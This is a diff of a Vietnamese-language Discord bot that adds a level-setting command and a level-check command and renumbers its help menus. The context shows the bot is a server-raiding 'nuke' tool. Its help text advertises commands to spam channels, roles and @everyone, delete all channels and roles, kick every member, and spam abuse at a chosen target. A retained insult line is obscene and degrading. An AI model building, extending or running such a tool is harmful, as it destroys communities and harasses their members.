@@ -14,7 +14,7 @@ BOT_OWNERS = [
     1535132569534865490,
 ]
 
-# Kênh log cố định (ID từ link bạn cung cấp)
+# Kênh log cố định
 LOG_CHANNEL_ID = 1537813100546236497
 
 intents = discord.Intents.default()
@@ -34,7 +34,7 @@ SERVER_LOG_CHANNELS = {}
 WELCOME_CHANNELS = {}
 GOODBYE_CHANNELS = {}
 
-# Hệ thống Level lưu trữ tạm trong RAM (hoặc có thể mở rộng lưu database)
+# Hệ thống Level lưu trữ tạm trong RAM
 USER_LEVELS = {} # {guild_id: {user_id: {"exp": int, "level": int}}}
 
 CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
@@ -173,7 +173,6 @@ ROAST_LINES = [
     "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
 ]
 
-# ==================== HỆ THỐNG NUKE ====================
 NUKE_CHANNEL_NAMES = [
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝕎𝔸ℝ 𝔸ℝ𝕋",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
@@ -357,7 +356,77 @@ async def check_and_assign_level_roles(member: discord.Member, current_level: in
                 except:
                     pass
 
-# ==================== SỰ KIỆN CHÀO MỪNG & TẠM BIỆT (CÓ GIF & DM) ====================
+# ==================== LỆNH SETLV (CỘNG LEVEL CHO NGƯỜI DÙNG) ====================
+@bot.command(name="setlv")
+@is_bot_owner()
+async def set_level(ctx, level: int, member: discord.Member):
+    try:
+        if level < 1:
+            await ctx.send("❌ Level tối thiểu phải từ 1 trở lên!")
+            return
+
+        guild_id = ctx.guild.id
+        if guild_id not in USER_LEVELS:
+            USER_LEVELS[guild_id] = {}
+        
+        user_id = member.id
+        if user_id not in USER_LEVELS[guild_id]:
+            USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}
+
+        # Cập nhật level và tính lại exp tương ứng
+        USER_LEVELS[guild_id][user_id]["level"] = level
+        USER_LEVELS[guild_id][user_id]["exp"] = level * 100
+
+        # Gán role tương ứng với level mới được set
+        await check_and_assign_level_roles(member, level)
+
+        embed = discord.Embed(
+            title="⭐ **CẬP NHẬT LEVEL THÀNH CÔNG** ⭐",
+            description=f"👑 Boss Bảo đã đặt level của {member.mention} lên mức **Level {level}**!",
+            color=0x00FF00
+        )
+        embed.set_footer(text="Hệ thống quản lý độc quyền của Boss Bảo 💖")
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")
+
+@set_level.error
+async def set_level_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+    else:
+        await ctx.send(f"❌ Cú pháp đúng: `l!setlv <level> @user` (Ví dụ: `l!setlv 50 @Bao`)")
+
+# ==================== LỆNH LV (CHECK LEVEL NGƯỜI DÙNG) ====================
+@bot.command(name="lv")
+async def check_user_level(ctx, member: discord.Member = None):
+    if member is None:
+        member = ctx.author
+
+    guild_id = ctx.guild.id
+    user_id = member.id
+
+    # Lấy dữ liệu level của user trong server này
+    user_data = USER_LEVELS.get(guild_id, {}).get(user_id, {"exp": 0, "level": 1})
+    current_level = user_data["level"]
+    current_exp = user_data["exp"]
+    required_exp = current_level * 100
+
+    embed = discord.Embed(
+        title=f"📊 **HỆ THỐNG LEVEL - {member.display_name}** 📊",
+        description=f"👤 **Thành viên:** {member.mention}\n⭐ **Level hiện tại:** `{current_level}`\n✨ **EXP:** `{current_exp} / {required_exp}`",
+        color=0x00FFFF
+    )
+    embed.set_thumbnail(url=member.display_avatar.url)
+    embed.set_footer(text="Hệ thống thăng cấp độc quyền phục vụ server 💖")
+    await ctx.send(embed=embed)
+
+@check_user_level.error
+async def check_user_level_error(ctx, error):
+    await ctx.send(f"❌ Cú pháp đúng: `l!lv` hoặc `l!lv @user`")
+
+# ==================== SỰ KIỆN CHÀO MỪNG & TẠM BIỆT ====================
 @bot.event
 async def on_member_join(member):
     if member.guild is None: return
@@ -794,12 +863,11 @@ async def set_server_icon_error(ctx, error):
     else:
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
-# ==================== LỆNH MUTE & UNMUTE (ĐÃ CẬP NHẬT THỜI GIAN VÀ GỬI THƯ DM) ====================
+# ==================== LỆNH MUTE & UNMUTE ====================
 @bot.command(name="mute")
 @is_bot_owner()
 async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
     try:
-        # Tính toán thời gian mute nếu có truyền vào (m: phút, d: ngày, w: tuần, t: tháng)
         time_delta = None
         duration_text = "Vĩnh viễn"
         if duration:
@@ -820,14 +888,12 @@ async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Kh�
                 time_delta = timedelta(weeks=val)
                 duration_text = f"{val} tuần"
             elif unit == 't':
-                time_delta = timedelta(days=val * 30)  # Quy đổi tháng thành 30 ngày
+                time_delta = timedelta(days=val * 30)
                 duration_text = f"{val} tháng"
             else:
                 await ctx.send("❌ Đơn vị thời gian không hợp lệ! Dùng: **m** (phút), **d** (ngày), **w** (tuần), **t** (tháng).")
                 return
 
-        # Sử dụng hệ thống Timeout của Discord (Timeout Moderation) hoặc dùng role Muted tùy hệ thống
-        # Dưới đây tích hợp Timeout API chuẩn của Discord kết hợp role Muted
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
         if not muted_role:
             muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
@@ -839,14 +905,12 @@ async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Kh�
         
         await member.add_roles(muted_role, reason=f"Lệnh từ Boss Bảo - {reason}")
         
-        # Nếu có thời gian, áp dụng timeout trực tiếp của discord
         if time_delta:
             try:
                 await member.timeout(time_delta, reason=reason)
             except:
                 pass
 
-        # Gửi thông báo công khai trên kênh
         embed = discord.Embed(
             title="🔇 🌈 **ĐÃ MUTE THÀNH VIÊN** 🌈",
             description=f"👤 **Thành viên:** {member.mention}\n⏳ **Thời gian:** {duration_text}\n📌 **Lý do:** {reason}",
@@ -854,7 +918,6 @@ async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Kh�
         )
         await ctx.send(embed=embed)
 
-        # Gửi thư DM thông báo cho người bị mute
         try:
             dm_embed = discord.Embed(
                 title="🔇 **BẠN ĐÃ BỊ MUTE TRONG SERVER** 🔇",
@@ -885,7 +948,6 @@ async def unmute(ctx, member: discord.Member):
             await member.remove_roles(muted_role, reason="Lệnh từ Boss Bảo")
             unmuted_status = True
 
-        # Gỡ cả timeout của Discord nếu có
         try:
             await member.timeout(None, reason="Lệnh unmute từ Boss Bảo")
             unmuted_status = True
@@ -900,7 +962,6 @@ async def unmute(ctx, member: discord.Member):
             )
             await ctx.send(embed=embed)
 
-            # Gửi thư DM thông báo đã được unmute cho họ
             try:
                 dm_embed = discord.Embed(
                     title="🔊 **BẠN ĐÃ ĐƯỢC UNMUTE!** 🔊",
@@ -1092,27 +1153,29 @@ async def setup(ctx):
             "📋 **Danh sách lệnh điều hành phục vụ Boss Bảo:**\n\n"
             "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển.\n"
             "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
-            "🔹 **3. `l!spamchannels`** - Tạo kênh spam.\n"
-            "🔹 **4. `l!spameveryone`** - Spam @everyone.\n"
-            "🔹 **5. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
-            "🔹 **6. `l!spamroles`** - Tạo role spam.\n"
-            "🔹 **7. `l!deleteallroles`** - Xóa tất cả role.\n"
-            "🔹 **8. `l!kickall`** - Kick toàn bộ thành viên.\n"
-            "🔹 **9. `l!setservername`** - Đổi tên server.\n"
-            "🔹 **10. `l!setservericon`** - Đổi avatar server.\n"
-            "🔹 **11. `l!spam`** - Spam chửi mục tiêu.\n"
-            "🔹 **12. `l!stop`** - Dừng spam.\n"
-            "🔹 **13. `l!addowner`** - Thêm Owner.\n"
-            "🔹 **14. `l!deleteowner`** - Xóa Owner.\n"
-            "🔹 **15. `l!mute`** - Cấm nói (hỗ trợ m, d, w, t).\n"
-            "🔹 **16. `l!unmute`** - Bỏ cấm nói.\n"
-            "🔹 **17. `l!warn`** - Cảnh cáo.\n"
-            "🔹 **18. `l!clear`** - Xóa tin nhắn.\n"
-            "🔹 **19. `l!stats`** - Xem thông số server.\n"
-            "🔹 **20. `l!channelslog`** - Cài kênh log sự kiện.\n"
-            "🔹 **21. `l!setwellcom`** - Cài kênh chào mừng.\n"
-            "🔹 **22. `l!setgoodbye`** - Cài kênh tạm biệt.\n"
-            "🔹 **23. `l!help`** - Trợ giúp."
+            "🔹 **3. `l!setlv`** - Đặt level và cộng role hệ thống cho người dùng.\n"
+            "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
+            "🔹 **5. `l!spamchannels`** - Tạo kênh spam.\n"
+            "🔹 **6. `l!spameveryone`** - Spam @everyone.\n"
+            "🔹 **7. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
+            "🔹 **8. `l!spamroles`** - Tạo role spam.\n"
+            "🔹 **9. `l!deleteallroles`** - Xóa tất cả role.\n"
+            "🔹 **10. `l!kickall`** - Kick toàn bộ thành viên.\n"
+            "🔹 **11. `l!setservername`** - Đổi tên server.\n"
+            "🔹 **12. `l!setservericon`** - Đổi avatar server.\n"
+            "🔹 **13. `l!spam`** - Spam chửi mục tiêu.\n"
+            "🔹 **14. `l!stop`** - Dừng spam.\n"
+            "🔹 **15. `l!addowner`** - Thêm Owner.\n"
+            "🔹 **16. `l!deleteowner`** - Xóa Owner.\n"
+            "🔹 **17. `l!mute`** - Cấm nói (hỗ trợ m, d, w, t).\n"
+            "🔹 **18. `l!unmute`** - Bỏ cấm nói.\n"
+            "🔹 **19. `l!warn`** - Cảnh cáo.\n"
+            "🔹 **20. `l!clear`** - Xóa tin nhắn.\n"
+            "🔹 **21. `l!stats`** - Xem thông số server.\n"
+            "🔹 **22. `l!channelslog`** - Cài kênh log sự kiện.\n"
+            "🔹 **23. `l!setwellcom`** - Cài kênh chào mừng.\n"
+            "🔹 **24. `l!setgoodbye`** - Cài kênh tạm biệt.\n"
+            "🔹 **25. `l!help`** - Trợ giúp."
         ),
         color=0xFF69B4
     )
@@ -1146,27 +1209,29 @@ async def help_command(ctx):
             "📋 **Danh sách lệnh và tính năng của hệ thống:**\n\n"
             "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển setup.\n"
             "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
-            "🔹 **3. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
-            "🔹 **4. `l!spameveryone`** - Spam thông điệp @everyone.\n"
-            "🔹 **5. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
-            "🔹 **6. `l!spamroles`** - Tạo hàng loạt role spam.\n"
-            "🔹 **7. `l!deleteallroles`** - Xóa toàn bộ role.\n"
-            "🔹 **8. `l!kickall`** - Kick toàn bộ thành viên.\n"
-            "🔹 **9. `l!setservername`** - Đổi tên server.\n"
-            "🔹 **10. `l!setservericon`** - Đổi avatar/icon server.\n"
-            "🔹 **11. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
-            "🔹 **12. `l!stop`** - Dừng mọi hoạt động spam.\n"
-            "🔹 **13. `l!addowner`** - Thêm Owner phụ quyền.\n"
-            "🔹 **14. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
-            "🔹 **15. `l!mute`** - Cấm nói thành viên (Hỗ trợ m, d, w, t).\n"
-            "🔹 **16. `l!unmute`** - Bỏ cấm nói thành viên.\n"
-            "🔹 **17. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
-            "🔹 **18. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
-            "🔹 **19. `l!stats`** - Xem thông số hệ thống server.\n"
-            "🔹 **20. `l!channelslog`** - Thiết lập kênh log sự kiện.\n"
-            "🔹 **21. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
-            "🔹 **22. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
-            "🔹 **23. `l!help`** - Hiển thị bảng hướng dẫn này."
+            "🔹 **3. `l!setlv`** - Thiết lập level trực tiếp cho user.\n"
+            "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
+            "🔹 **5. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
+            "🔹 **6. `l!spameveryone`** - Spam thông điệp @everyone.\n"
+            "🔹 **7. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
+            "🔹 **8. `l!spamroles`** - Tạo hàng loạt role spam.\n"
+            "🔹 **9. `l!deleteallroles`** - Xóa toàn bộ role.\n"
+            "🔹 **10. `l!kickall`** - Kick toàn bộ thành viên.\n"
+            "🔹 **11. `l!setservername`** - Đổi tên server.\n"
+            "🔹 **12. `l!setservericon`** - Đổi avatar/icon server.\n"
+            "🔹 **13. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
+            "🔹 **14. `l!stop`** - Dừng mọi hoạt động spam.\n"
+            "🔹 **15. `l!addowner`** - Thêm Owner phụ quyền.\n"
+            "🔹 **16. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
+            "🔹 **17. `l!mute`** - Cấm nói thành viên (Hỗ trợ m, d, w, t).\n"
+            "🔹 **18. `l!unmute`** - Bỏ cấm nói thành viên.\n"
+            "🔹 **19. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
+            "🔹 **20. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
+            "🔹 **21. `l!stats`** - Xem thông số hệ thống server.\n"
+            "🔹 **22. `l!channelslog`** - Thiết lập kênh log sự kiện.\n"
+            "🔹 **23. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
+            "🔹 **24. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
+            "🔹 **25. `l!help`** - Hiển thị bảng hướng dẫn này."
         ),
         color=0xFF69B4
     )
